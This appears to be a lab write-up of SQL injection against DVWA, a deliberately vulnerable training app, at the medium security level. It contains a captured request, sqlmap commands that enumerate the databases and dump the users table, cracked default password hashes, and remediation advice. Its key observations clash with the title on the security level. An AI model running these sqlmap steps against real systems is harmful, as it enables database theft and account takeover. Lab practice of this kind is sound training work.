# DVWA SQL Injection Report Level Medium

## Overview

This report documents the discovery and exploitation of a SQL Injection vulnerability
in a DVWA (Damn Vulnerable Web Application) lab environment, along
with remediation recommendations.

---

## 1. Reconnaissance & Request Capture

The login request was intercepted using Burp Suite:

```
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: dvwa-1.homelab.local
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://dvwa-1.homelab.local/vulnerabilities/sqli/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=6ccba7a978f66dd1e679352c30638458; security=medium
Connection: keep-alive
```

### Key Observations

- Parameter `id` is user-controlled
- Application uses GET requests
- Session cookie required
- Security level set to **low**

---

## 2. Preparing the Attack

The captured request was saved into a file:

```
sqlmap-input.txt
```

This allowed replaying an authenticated request using sqlmap.

---

## 3. Vulnerability Discovery

Command used:

```
sqlmap -r sqlmap-input.txt --random-agent --dbs --level=2
```

### Results

- Parameter `id` is vulnerable to SQL injection
- Backend DBMS identified: **MySQL (MariaDB)**
- Injection types discovered:
  - Boolean-based blind
  - Error-based
  - Time-based blind
  - UNION-based

---

## 4. Enumeration

### Databases discovered

- dvwa
- information_schema
- test

### Tables in `dvwa`

- users
- guestbook
- access_log
- security_log

### Target table

```
users
```

---

## 5. Exploitation (Data Extraction)

Command used:

```
sqlmap -r sqlmap-input.txt --dump -D dvwa -T users
```

### Extracted Data

``` bash
Database: dvwa
Table: users
[5 entries]
+---------+--------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
| user_id | role   | user    | avatar                      | password                                    | last_name | first_name | last_login          | failed_login | account_enabled |
+---------+--------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
| 1       | admin  | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin     | admin      | 2026-04-13 10:43:09 | 0            | 1               |
| 2       | user   | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)   | Brown     | Gordon     | 2026-04-13 10:43:09 | 0            | 1               |
| 3       | user   | 1337    | /hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  | Me        | Hack       | 2026-04-13 10:43:09 | 0            | 1               |
| 4       | user   | pablo   | /hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  | Picasso   | Pablo      | 2026-04-13 10:43:09 | 0            | 1               |
| 5       | user   | smithy  | /hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith     | Bob        | 2026-04-13 10:43:09 | 0            | 1               |
+---------+--------+---------+-----------------------------+---------------------------------------------+-----------+------------+---------------------+--------------+-----------------+
```

### Notes

- Passwords were stored as **unsalted MD5 hashes**
- sqlmap successfully cracked them using a dictionary attack

---

## 6. Impact

This vulnerability allows:

- Unauthorized access to user accounts
- Credential theft
- Privilege escalation (admin access)
- Full database enumeration

---

## 7. Root Cause

The vulnerability exists due to:

- Direct insertion of user input into SQL queries
- No input sanitization
- No prepared statements
- Weak password hashing (MD5)

---

## 8. Remediation Recommendations

### 1. Use Prepared Statements

Replace dynamic SQL queries with parameterized queries.

### 2. Implement Strong Password Hashing

Use:

- bcrypt
- argon2

### 3. Input Validation & Sanitization

- Validate all user inputs
- Reject unexpected characters

### 4. Deploy a Web Application Firewall (WAF)

- Detect SQL injection patterns
- Block malicious payloads

### 5. Monitoring & Logging

- Detect abnormal query behavior
- Alert on repeated injection attempts

---

## 9. Lessons Learned

### Offensive

- Importance of request replay (`-r`)
- Value of UNION-based SQLi
- Structured enumeration approach

### Defensive

- SQL injection is still a critical risk
- Logging and detection are essential
- Secure coding practices prevent exploitation

---

## Conclusion

The DVWA application was fully compromised through SQL Injection, demonstrating how improper input handling can lead to complete data exposure. Proper remediation steps must be implemented to prevent such attacks in real-world environments.
